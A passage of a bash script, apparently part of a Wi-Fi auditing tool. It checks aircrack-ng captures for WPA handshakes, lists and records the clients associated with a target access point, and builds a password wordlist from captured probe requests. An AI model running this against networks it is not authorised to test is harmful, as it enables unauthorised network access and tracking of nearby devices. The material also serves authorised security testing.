   \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"       <------ ^ ------>        \"\necho -e \"            Scann               \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"        <----- ^ ----->         \"\necho -e \"            Scan                \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"         <---- ^ ---->          \"\necho -e \"            Sca                 \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"          <--- ^ --->           \"\necho -e \"            Sc                  \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"           <-- ^ -->            \"\necho -e \"            S                   \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"            <- ^ ->             \"\necho -e \"               *                \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\ntput rc\ntput ed\n}\n\n\n\n\nERRORCHKTEST=ZZZ\n\nERRORCHK_fn()\n{\n\nuntil  [ $ERRORCHKTEST == y ] || [ $ERRORCHKTEST == Y ]; do  \n\necho \"\"\necho \"\"\necho -e \"$info$bold  $undr Error Handling Routines $txtrst\"\necho -e \"\"\necho -e \"$info     The script has embedded error handling routines to lessen the chance\"\necho -e \"$info  of input error. These checks can be turned off. It is suggest that until\"\necho -e \"$info  the user obtains some experience with the program that these checks be\"\necho -e \"$info  left in place.\"\n  \necho -e \"$inp     Enter$yel (y/Y)$inp to use these error handling checks.\" \necho -e \"$inp     Enter$yel (n/N)$inp to not use these features.$txtrst\"\necho -e \"$yel       !!!$warn Entering$yel (n/N)$warn for new users is NOT RECOMMENDED$yel !!!$txtrst\"\n\n\tread ERRORCHK\n\n\twhile true\n\tdo\n\n   echo \"\"\n   echo -e  \"$inp      You entered$yel $ERRORCHK$inp  Select$yel (y/Y)$inp to continue.\"\n   echo -e  \"$inp  Select$yel (n/N)$inp to try again.$txtrst\"\nread ERRORCHKTEST\n\n\tcase $ERRORCHKTEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e  \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\tclear\n\t\tdone\n\n\n}\n\n\n\n\n\nAIRO_WPS_fn()\n{\n\n# Test for airodump-ng --wps support for aircrack-ng installs in 1.1 2.0 etc\n# If wpsavail=--wps then supported\n# MTeams Progammers Note when grep airodump-ng output sometime spaces must be added.\n# See -- wps variable with grep below. Cannot grep --wps!!!\n# See also removing 001B from airodump-ng text output in Dead DNA module.\n \nwpsavail=$(airodump-ng --help | grep -- wps | awk '{print $1}')\n\n}\n\nAIRO_WPS_fn\n\nIFCONFIG_TYPE_fn()\n{\n# Note text output of ifconfig in kali2016 rolling has been altered\n# Any routines requiring the use of text output must be altered\n# Routine tests ifconfig process ouput \n# Written as fn for portability into other MTeam prog.\n\niftype=$(ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 == \"ether\") || (substr($1,length($1),1) == \":\")) {print \"ether\";exit;}}')\n\n\tif [[ $iftype == \"ether\" ]]; then\n\n\t\tifselect=new\n\n\telse\n\n\t\tifselect=old\n\n\t\tfi\n\n}\n\nWPA_CAP_fn()\n\n{\n\nshakstat=0\n\naircrack-ng /tmp/HANDTEST/\"$bssid-01.cap\"  | cat > /tmp/HANDTEST/\"aircrack.txt\"\n\nsleep 1\n\n#xargs remove trailing white space\n\n\tif [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]] ; then\n\nWPAZERO=$(cat < /tmp/HANDTEST/\"aircrack.txt\" | grep WPA | awk -F \"WPA\" '/WPA/ {print $2}' | xargs)\n\n\t\tfi\n\n# For 1.1\n\n\tif [[ $KALI_TYPE == 1 ]]; then\n\nWPAZERO=$(cat < /tmp/HANDTEST/\"aircrack.txt\" | grep WPA | awk -F \"WPA\" '/WPA/ {print $2}' | xargs)\n\n#WPAZERO=$( echo $WPAZERO | awk '{print $2}' | xargs)\n\n\t\tfi\n\n#Working\n#WPAZERO=$(cat < /tmp/HANDTEST/\"aircrack.txt\" | sed 's/\\x1b//g' | sed 's/11B//g' | grep WPA | awk -F \"WPA\" '/WPA/ {print $2}' | xargs)\n#cat /tmp/HANDTEST/aircracktest.txt | sed 's/\\x1b//g' | sed 's/11B//g' > /tmp/HANDTEST/aircracktest1.txt\n\n#leaves whitespace remove wih xargs\n#echo \"WPAZERO=$WPAZERO\"\n#echo \"length WPAZERO= ${#WPAZERO}\"\n\nsleep 1\n\nif [[ \"$WPAZERO\" = \"(1 handshake)\" ]] && [[ $KALI_TYPE == 2 || $KALI_TYPE == 3 ]]; then\n\n#\techo \" debug $WPAZERO\"\n\techo \"[+] Handshake found for $ssid\"\n\tshakstat=1\t\n\n#\telse\n\n#\techo \" debug $WPAZERO\"\n#\techo \" [+] No Handshake FOUND for $ssid\"\n#\techo \"[+] Handshakes found =$WPAZERO\"\n#\tshakstat=0\n\t#Debug\n\t#shakstat=0\n\t#Debug\n\n\telif [[ \"$WPAZERO\" = \"(1 handshake)\" ]] && [[ $KALI_TYPE == 1 ]]; then\n\n#\techo \" debug $WPAZERO\"\n\techo \"[+] Handshake found for $ssid\"\n\tshakstat=1\t\n\n\telse\n\n#\techo \" debug $WPAZERO\"\n\techo \"[+] No Handshake FOUND for $ssid\"\n#\techo \"[+] Handshakes found =$WPAZERO\"\n\tshakstat=0\n\t#Debug\n\t#shakstat=0\n\t#Debug\n\n\t\tfi\n\n}\n\n\n#~~~~~~~~~~~~~~~Start Find Client Associated Start~~~~~~~~~~~~~~~#\n\nASSOC_CLIENT_fn()\n\n{\n\nif [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+]\"\nsleep 1\necho -e \"$txtrst[+] ************Standby************\"\nsleep 1\necho -e \"$txtrst[+] Looking for associated clients.\"\nsleep 1\necho -e \"$txtrst[+]\"\nsleep 1\n\nif [ ! -d \"VARMAC_AIRCRACK\" ]; then\n\n    mkdir -p -m 700 VARMAC_AIRCRACK;\n\n\tfi\n\nif [ -f  /tmp/HANDTEST/$bssid-01.csv ]; then\n\n# Commentary sed 's/,//g' remove commas\n# Easy way to handle irregular line end run thru dos2unix\n# Leave only lines with Possible data\n\ncat < /tmp/HANDTEST/$bssid-01.csv  | sed 's/,//g' | awk -F' ' '{print $1\" \"$7\" \"$8}' > /tmp/HANDTEST/$bssid-01.txt\n\nsleep .5\n\n#Remove commas\n\ncat < /tmp/HANDTEST/$bssid-01.txt | awk -F\",\" '/1/ {print $1 $2 $3  }' > /tmp/HANDTEST/$bssid-02.txt\n\nsleep .5\n\n#Strip down to three(3) entries \n\ncat < /tmp/HANDTEST/$bssid-02.txt | dos2unix | tr [a-f] [A-F]  | awk -F' ' '{ if((length($3) == 17 )) {print $1\" \" $2 \" \" $3 }}' > /tmp/HANDTEST/$bssid-03.txt\n\nsleep .5\n\n#Remove the mon0 ie data produced by self from the list\n\n#Move to uppercase to match aircrack-ng text output\n\nMACRMV=\"$VARMAC\"\n\nMACRMV=$(echo $MACRMV | awk '{print toupper($0)}')\n\n#To uppercase\n#bssid=$(echo $bssid | tr [a-f] [A-F])\n\ncat < /tmp/HANDTEST/$bssid-03.txt | dos2unix | awk -v mon=$MACRMV -F' ' '{ if($1 != mon ) {print $0}}' > /tmp/HANDTEST/$bssid-04.txt\n\nsleep .5\n\n#Remove all but target\n\ncat < /tmp/HANDTEST/$bssid-04.txt | dos2unix | awk -v targetap=$bssid -F' ' '{ if($3 == targetap) {print $0}}' > /tmp/HANDTEST/$bssid-05.txt\n\nsleep .5\n\n#Print file with just data value could remove if statement\n\n#Find highest value\n\ncat < /tmp/HANDTEST/$bssid-05.txt | dos2unix | awk -v targetap=$bssid -F' ' '{ if($3 == targetap) {print $2}}' > /tmp/HANDTEST/$bssid-06.txt\n\nsleep .5\n\n#### Start Working ###\n\n#### Build History of associated macs####\n\nif [ ! -f  \"/root/VARMAC_AIRCRACK/$TARGETAP-client.txt\" ]; then\n\n\ttouch /root/VARMAC_AIRCRACK/$bssid-client.txt\n\n\tfi\n\nif [ ! -f  \"/root/VARMAC_AIRCRACK/$TARGETAP-client.txt\" ]; then\n\n\ttouch /tmp/$bssid-client.txt\n\n\tfi\n\nMAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06.txt)\n\nsleep .5\n\nCLIASO_MAX=$(cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')\n\nsleep .5\n\ncat < /tmp/HANDTEST/$bssid-05.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) { print $0 }}' > /tmp/HANDTEST/$bssid-05a.txt\n\nsleep .5\n\n#Find middle value of top three\n\ncat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/HANDTEST/$bssid-06a.txt\n\nsleep .5\n\nMAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06a.txt)\n\nsleep .5\n\nCLIASO_MID=$(cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')\n\nsleep .5\n\ncat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $0}}' > /tmp/HANDTEST/$bssid-05b.txt\n\nsleep .5\n\ncat < /tmp/HANDTEST/$bssid-05b.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/HANDTEST/$bssid-06b.txt\n\nsleep .5\n\nMAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06b.txt)\n\nsleep .5\n\nCLIASO_LOW=$(cat < /tmp/HANDTEST/$bssid-05b.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')\n\n#Write variables for historical record\n\n\tif [ ! -z $CLIASO_MAX ]; then\n\n\t\techo \"$CLIASO_MAX\" >> /tmp/$bssid-client.txt\n\n\t\t\tfi\n\n\tif [ ! -z $CLIASO_MID ]; then\n\n\t\techo \"$CLIASO_MID\" >> /tmp/$bssid-client.txt\n\n\t\t\tfi\n\n\tif [ ! -z $CLIASO_LOW ]; then\n\n\t\techo \"$CLIASO_LOW\" >> /tmp/$bssid-client.txt\n\n\t\t\tfi\n\ncat < /root/VARMAC_AIRCRACK/$bssid-client.txt >> /tmp/$bssid-client.txt\n\nrm -f /root/VARMAC_AIRCRACK/$bssid-client.txt\n\ncat < /tmp/$bssid-client.txt | sort -u > /root/VARMAC_AIRCRACK/$bssid-client.txt\n\nrm -f /tmp/$bssid-client.txt\n\n######\n\necho -e \"$txtrst[+]$info Clients that have been seen associated to $bssid see:$txtrst\"\nsleep 1\necho -e  \"[+]\"\nsleep 1\necho -e \"$txtrst[+]   root/VARMAC_AIRCRACK/$bssid-client.txt\"\nsleep 1\necho -e  \"[+]\"\nsleep 1\necho -e \"$txtrst[+]$info Clients currently associated to $bssid $txtrst\"\nsleep 1\necho -e \"$txtrst[+]$info arranged by order of activity are listed below:\"\nsleep 1\necho -e \"$txtrst[+]\"\nsleep 1\n#check var not null\n\nif [[ ! -z $CLIASO_MAX ]]; then\n\t\n\techo -e \"$txtst[+] $CLIASO_MAX\"\n\n\telse\n\tsleep 1\n#\techo -e \"$txtrst[+]\"\n\techo -e \"$txtrst[+] No clients are currently associated to $bssid\"\n#\techo -e \"$txtrst[+]\"\n\n\t\tfi\n\nif [[ ! -z $CLIASO_MID ]]; then\n\tsleep 1\n\techo -e \"$txtst[+] $CLIASO_MID\"\n\n\t\tfi\n\nif [[ ! -z $CLIASO_LOW ]]; then\n\tsleep 1\n\techo -e \"$txtst[+] $CLIASO_LOW\"\n\n\t\tfi\n\n\tfi\n\n\t\tfi # Linked to[[ $shakstat == 0 ]]; then\n\n}\n\n#~~~~~~~~~~~~~~Start ESSIDPROBE_fn Start~~~~~~~~~~~~~~# \n\nESSIDPROBE_fn()\n\n{\n\n# Copy files from folder used by handshake harvest\n\nrm -f /tmp/ESSIDPROBE_DIR/*.kismet.csv\n\nif [ ! -f  \"/tmp/ESSIDPROBE_DIR/allcsv.txt\" ]; then\n\n\ttouch /tmp/ESSIDPROBE_DIR/allcsv.txt\n\n\tfi\n\n#countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`\n\n#echo \" 315 debug /root/*.csv $countcsv1\"\n\n#\tif [[ $countcsv1 != 0 ]] && [[ $countcsv1 != $countcsv ]]; then\n\n#\t\tcat /root/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt\n\n#\t\t\tfi\n\n\ncountcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`\n\n#\techo \" 324 debug /tmp/ESSIDPROBE_DIR/*.csv $countcsv1\"\n\nif [[ $countcsv1 != 0 ]]; then\n\ncat /tmp/ESSIDPROBE_DIR/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt\n\nsleep 1\n\nrm -f /tmp/ESSIDPROBE_DIR/*.csv\n\n\n#debug\ncountcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/allcsv.txt 2>/dev/null | wc -l`\n\n#echo \" 335 debug /tmp/ESSIDPROBE_DIR/allcsv.txt $countcsv1\"\n\n\tfi\n\nsleep .1\n#######################################################\n\n# Sed commentary for MTeam prog\n#sed 's/^[ \\t]*//;s/[ \\t]*$//' = Remove begin and end\n#sed 's/.$//' = Convert to unix\n#sed '/^$/d' remove blank lines\n#sed 's/,/ /g' replace comma wih space\n\nif [[ $KALI_TYPE == 1 ]]; then\n\ncat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk -F' ' '{ if((length($8) == 18 )) {$1=$2=$3=$4=$5=$6=$7=$8=\"\"; print $0 }}' | sed 's/^[ \\t]*//;s/[ \\t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt\n\n\t\tfi\n\nif [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]] ; then\n\ncat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $0 }}' | sed 's/.$//;s/^[ \\t]*//;s/[ \\t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt\n\n\t\tfi\n\nsleep .2\n\n#Field 1\necho \"[+] Writing ESSID probes Field 1\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 }' > /tmp/ESSIDPROBE_DIR/holdfield01a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 \" \" $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 \" \" $2 \" \" $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01e.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 \" \" $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01f.txt\n\n#Field 2\necho \"[+] Writing ESSID probes Field 2\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 }' > /tmp/ESSIDPROBE_DIR/holdfield02a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield02b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 \" \" $3 \" \" $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02e.txt\n\n#Field 3\necho \"[+] Writing ESSID probes Field 3\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 }' > /tmp/ESSIDPROBE_DIR/holdfield03a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 \" \" $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 \" \" $4 \" \" $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03e.txt\n\n#Field 4\necho \"[+] Writing ESSID probes Field 4\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 }' > /tmp/ESSIDPROBE_DIR/holdfield04a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 \" \" $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 \" \" $5 \" \" $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04e.txt\n\n#Field 5\necho \"[+] Writing ESSID probes Field 5\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 }' > /tmp/ESSIDPROBE_DIR/holdfield05a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 \" \" $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 \" \" $6 \" \" $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05e.txt\n\n#Field 6\necho \"[+] Writing ESSID probes Field 6\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 }' > /tmp/ESSIDPROBE_DIR/holdfield06a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 \" \" $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 \" \" $7 \" \" $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06e.txt\n\n#Field 7\necho \"[+] Writing ESSID probes Field 7\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 }' > /tmp/ESSIDPROBE_DIR/holdfield07a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 \" \" $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 \" \" $8 \" \" $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07e.txt\n\n#Field 8\necho \"[+] Writing ESSID probes Field 8\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 }' > /tmp/ESSIDPROBE_DIR/holdfield08a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 \" \" $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 \" \" $9 \" \" $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08e.txt\n\n#Field 9\necho \"[+] Writing ESSID probes Field 9\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 }' > /tmp/ESSIDPROBE_DIR/holdfield09a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 \" \" $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 \" \" $10 \" \" $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09e.txt\n\n#Field 10\necho \"[+] Writing ESSID probes Field 10\"\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 }' > /tmp/ESSIDPROBE_DIR/holdfield10a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 \" \" $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 \" \" $11 \" \" $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10e.txt\n\ncat /tmp/ESSIDPROBE_DIR/holdfield*.txt >> /tmp/ESSIDPROBE_DIR/holdall16.txt\n\nrm -f /tmp/ESSIDPROBE_DIR/holdfield*.txt\n\nsleep 2\n\n# Removes white spaces from left, limits length, sorts and removes duplicates\n\ncat /tmp/ESSIDPROBE_DIR/holdall16.txt | sed 's/,/ /g' | sed 's/^[ \\t]*//;s/[ \\t]*$//' | awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt\n\necho \"[+] Sorting essidprobesdic.txt\"\nsleep .2\n\ncat /root/PROBEESSID_DATA/essidprobesdic.txt  > /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt\n\nsleep .2\n\nrm -f /root/PROBEESSID_DATA/essidprobesdic.txt\n\ncat  /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt > /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt\n\nsleep .2\n\n# shorter strings\n\ncat /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt | sed 's/^[ \\t]*//;s/[ \\t]*$//' | awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt\n\nsleep .2\n\ncat /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt\n\nsleep .2\n\ncp -f /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt /root/PROBEESSID_DATA/essidprobesdic.txt\n\necho \"[+] Transfering essidprobesdic.txt to /root/PROBEESSID_DATA/\"\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $1 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05a.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $2 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05b.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $3 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05c.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $4 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05d.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $5 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05e.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $6 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05f.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $7 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05g.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $8 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05h.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $9 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05i.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=\"\"; print $10 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05j.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidrefhold-05*.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold05.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt | sed s'/,/ /'g | sed 's/     / /g' | sed 's/    / /g' | sed 's/   / /g' | sed 's/  / /g' | sed 's/ / /g' > /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $1 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX18dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $2 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX28dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $3 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX38dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $4 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX48dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $5 }' | uniq -u >> 